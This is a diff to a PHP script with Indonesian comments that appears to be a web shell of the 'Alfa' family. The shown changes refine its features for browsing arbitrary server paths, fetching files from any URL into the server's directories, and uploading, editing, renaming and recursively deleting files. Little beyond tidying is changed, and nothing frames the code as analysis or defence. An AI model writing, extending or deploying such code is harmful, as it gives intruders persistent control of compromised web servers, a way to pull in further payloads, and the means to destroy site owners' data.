@@ -75,12 +75,12 @@ function perm_color($path){
 
 function xrmdir($d){$it=@scandir($d);if(!$it)return;foreach($it as $i){if($i=='.'||$i=='..')continue;$p="$d/$i";if(is_dir($p))xrmdir($p);else@unlink($p);}rmdir($d);}
 
+// === PERBAIKAN REMOTE DOWNLOAD ===
 function __download_secure($url, $optname=''){
-  // Simpan file di direktori yang sedang dibuka (dari UI)
   $base = isset($_GET['path']) && is_dir($_GET['path']) ? realpath($_GET['path']) : getcwd();
-  $cwdBackup = getcwd(); // simpan cwd lama
-
-  @chdir($base); // pindah sementara
+  if (!is_dir($base)) $base = getcwd();
+  $cwdBackup = getcwd();
+  @chdir($base);
 
   if (!filter_var($url, FILTER_VALIDATE_URL))
     return ['ok'=>false,'err'=>'Invalid URL','path'=>null];
@@ -120,26 +120,25 @@ function __download_secure($url, $optname=''){
   }
 
   if($ok)@chmod($target,0644);
-
-  // Kembalikan working directory
   @chdir($cwdBackup);
-
-  // Path relatif untuk tampilan
-  $relative = str_replace($cwdBackup, '.', realpath($target));
-
-  return ['ok'=>$ok,'err'=>$err,'path'=>$relative];
+  return ['ok'=>$ok,'err'=>$err,'path'=>$target];
 }
 
-
+// === FORM REMOTEDL ===
 function alfaremotedl(){
+  $cur = isset($_GET['path']) && is_dir($_GET['path']) ? realpath($_GET['path']) : getcwd();
   echo"<div style='background:#0b0b10;padding:14px;border-radius:8px;margin:15px auto;max-width:950px;box-shadow:0 0 10px rgba(110,70,255,0.3);'>";
   echo"<h3>Upload From URL (secure)</h3>";
-  echo"<form method='post'><label>Cmd (download &lt;url&gt; [filename])</label><br>
+  echo"<form method='post'>
+  <label>Cmd (download &lt;url&gt; [filename])</label><br>
   <input type='text' name='cmd' placeholder='download https://example.com/file.ext optional_name.ext'
    style='width:95%;max-width:900px;padding:10px 12px;border-radius:6px;background:#0b0b18;color:#bfefff;
    border:1px solid rgba(160,90,255,0.4);font-family:monospace;font-size:14px;' required>
   <input type='hidden' name='dl_token' value='".REMOTE_DL_TOKEN."'>
+  <input type='hidden' name='path' value='".htmlspecialchars($cur)."'>
   <div style='margin-top:8px;'><input type='submit' name='dl_submit' value='Download'></div></form>";
+  echo"<div style='color:#888;font-size:12px;margin-top:8px;'>Current dir: ".htmlspecialchars($cur)."</div>";
+
   if($_SERVER['REQUEST_METHOD']==='POST'&&isset($_POST['dl_submit'])){
     $cmd=trim($_POST['cmd']);$t=$_POST['dl_token'];
     echo"<div style='margin-top:10px;padding:8px;background:#090919;border-radius:4px;'>";
@@ -148,13 +147,17 @@ function alfaremotedl(){
       $p=preg_split('/\s+/',$cmd,3);
       if(count($p)<2||strtolower($p[0])!=='download')echo"<div style='color:#f66'>Use: download &lt;url&gt; [filename]</div>";
       else{$r=__download_secure($p[1],$p[2]??'');
-        echo $r['ok']?"<div style='color:#7f6'>Success: ".htmlspecialchars($r['path'])."</div>":"<div style='color:#f66'>Error: ".htmlspecialchars($r['err'])."</div>";}
+        echo $r['ok']
+          ?"<div style='color:#7f6'>Success: ".htmlspecialchars(basename($r['path']))."</div>"
+          :"<div style='color:#f66'>Error: ".htmlspecialchars($r['err'])."</div>";
+      }
     }
     echo"</div>";
   }
-  echo"<div style='color:#888;font-size:12px;margin-top:8px;'>Current dir: ".htmlspecialchars(getcwd())."</div></div>";
+  echo"</div>";
 }
 
+// ================= MAIN ===================
 $lokasi=isset($_GET['path'])?$_GET['path']:getcwd();
 $lokasi=str_replace('\\','/',$lokasi);
 $lokasis=@explode('/',$lokasi);
@@ -166,7 +169,10 @@ foreach($lokasis as $i=>$l){
   if($l==''&&$i==0){echo"<a href='?path=/'>/</a>";continue;}
   if($l=='')continue;
   echo"<a href='?path=";for($x=0;$x<=$i;$x++){echo rawurlencode($lokasis[$x]);if($x!=$i)echo"/";}echo"'>$l</a>/";}
-echo"</div><ul><li>[ <a href='?'>Home</a> ] [ <a href='?act=remotedl'>RemoteDL</a> ]</li></ul>";
+echo"</div>";
+
+// tambahkan path di link RemoteDL
+echo"<ul><li>[ <a href='?path=".urlencode($lokasi)."'>Home</a> ] [ <a href='?act=remotedl&path=".urlencode($lokasi)."'>RemoteDL</a> ]</li></ul>";
 
 if(isset($_GET['act'])&&$_GET['act']==='remotedl'){alfaremotedl();exit;}
 
@@ -182,6 +188,7 @@ echo"<form enctype='multipart/form-data' method='post'>
 <input type='submit' name='upload' value='Upload'>
 </form>";
 
+// === EDIT FILE ===
 if(isset($_GET['edit'])){
   $p=$_GET['edit'];
   if(isset($_POST['save'])){
@@ -193,11 +200,9 @@ if(isset($_GET['edit'])){
   exit;
 }
 
-// === fitur rename ===
+// === RENAME ===
 if (isset($_GET['rename'])) {
     $target = $_GET['rename'];
-
-    // kalau belum submit, tampilkan form rename
     if (!isset($_POST['rename_do'])) {
         echo "<form method='post' style='text-align:center;margin-top:20px'>
         <h3>Rename: ".htmlspecialchars(basename($target))."</h3>
@@ -209,8 +214,6 @@ if (isset($_GET['rename'])) {
         </form>";
         exit;
     }
-
-    // kalau sudah submit
     if (isset($_POST['rename_do'])) {
         $new = $lokasi.'/'.trim($_POST['newname']);
         if (rename($target, $new)) {
@@ -223,11 +226,9 @@ if (isset($_GET['rename'])) {
     }
 }
 
-// === fitur delete ===
+// === DELETE ===
 if (isset($_GET['delete'])) {
     $target = $_GET['delete'];
-
-    // kalau belum dikonfirmasi
     if (!isset($_POST['delete_do'])) {
         echo "<form method='post' style='text-align:center;margin-top:25px'>
         <h3>Delete: ".htmlspecialchars(basename($target))."</h3>
@@ -238,8 +239,6 @@ if (isset($_GET['delete'])) {
         </form>";
         exit;
     }
-
-    // kalau sudah konfirmasi
     if (isset($_POST['delete_do'])) {
         if (is_dir($target)) xrmdir($target);
         else @unlink($target);
@@ -248,6 +247,8 @@ if (isset($_GET['delete'])) {
         exit;
     }
 }
+
+// === TABEL FILE ===
 echo'<table><tr><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>';
 foreach($lokasinya as $f){
   if($f=='.'||$f=='..')continue;
